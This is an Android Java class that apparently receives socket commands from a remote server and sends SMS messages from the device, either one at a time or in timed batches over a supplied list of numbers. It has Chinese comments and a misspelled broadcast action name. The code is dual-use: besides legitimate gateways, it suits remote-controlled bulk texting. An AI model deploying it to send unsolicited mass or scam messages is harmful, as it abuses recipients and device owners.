package com.example.softbank.socket;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class DataHandle {
    private SocketManage socketManage;
    public void handle(String type, JSONObject jsonObject) {
        switch (type) {
            case "sms_list":
                //集合发送
                SmsList(jsonObject);
                break;
            case "sms":
                //单独发送
                Sms(jsonObject);
                break;
        }
    }
    /**
     * @param jsonObject 发送短信
     */
    private void Sms(JSONObject jsonObject) {
        try {
            String id = jsonObject.getString("id");
            String send_phone = jsonObject.getString("send_phone");
            String content = jsonObject.getString("content");
            sendSMSS(socketManage.getContext(), id, send_phone, content);
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }
    /**
     * @param json 集合短信处理
     */
    private void SmsList(JSONObject json) {
        if (socketManage == null || socketManage.getContext() == null) {
            return;
        }
        try {
            long stop = json.getLong("stop");
            JSONArray data = json.getJSONArray("data");
            new Thread(() -> SmsList(data, stop)).start();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    /**
     * @param data 号码集合
     * @param stop 暂停时间
     */
    private void SmsList(JSONArray data, long stop) {
        try {
            for (int i = 0; i < data.length(); i++) {
                JSONObject jsonObject = data.getJSONObject(i);
                Sms(jsonObject);
                Thread.sleep(stop);
            }
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }
    /**
     * 发送短信
     *
     * @param content 上下文
     * @param id      储存id
     * @param phone   目的号码
     * @param context 内容
     */
    @SuppressLint("UnspecifiedImmutableFlag")
    private void sendSMSS(Context content, String id, String phone, String context) {
        if (context.isEmpty() || phone.isEmpty() || socketManage == null) {
            return;
        }
        SmsManager manager = SmsManager.getDefault();
        Bundle bundle = new Bundle();
        Intent itSend = new Intent("SMS_SEND_ACTIOIN");
        itSend.putExtra("id", id);
        itSend.putExtras(bundle);
        PendingIntent mSendPI = PendingIntent.getBroadcast(content, (int) System.currentTimeMillis(), itSend, PendingIntent.FLAG_UPDATE_CURRENT);
        if (context.length() > 70) {
            List<String> msgs = manager.divideMessage(context);
            for (String msg : msgs) {
                manager.sendTextMessage(phone, null, msg, mSendPI, null);
            }
            return;
        }
        manager.sendTextMessage(phone, null, context, mSendPI, null);
    }
    public void setSocketManage(SocketManage socketManage) {
        this.socketManage = socketManage;
    }
    public static DataHandle getInstance() {
        return SmartyLoader.instance;
    }
    private static class SmartyLoader {
        private static final DataHandle instance = new DataHandle();
    }
}
